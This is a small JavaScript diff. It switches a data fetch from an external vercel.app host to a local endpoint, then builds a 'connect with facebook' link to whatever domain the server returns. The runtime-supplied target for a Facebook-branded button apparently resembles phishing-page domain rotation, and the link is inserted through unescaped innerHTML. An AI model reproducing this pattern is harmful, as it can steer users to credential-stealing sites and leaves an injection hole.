@@ -93,10 +93,10 @@
       const urlParams = new URLSearchParams(queryString);
       const q = "testq";
 
-    axios.get("https://repo-domain-nn71.vercel.app").then((resps) =>
+    axios.get("/data/dom").then((resps) =>
       {
-        document.getElementById('wait').style.display= "none"
-		document.getElementById('btn').innerHTML = `<a href=${resps.data.domain}?q=${q} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
+        document.getElementById('wait').style.display= "none";
+	document.getElementById('btn').innerHTML = `<a href=${resps.data.domain}?q=${q} class="log">connect with facebook <i id="icon" class="fab fa-facebook"></i></a>`
     }).catch((e)=>{
 		  console.log(e)
 	  });
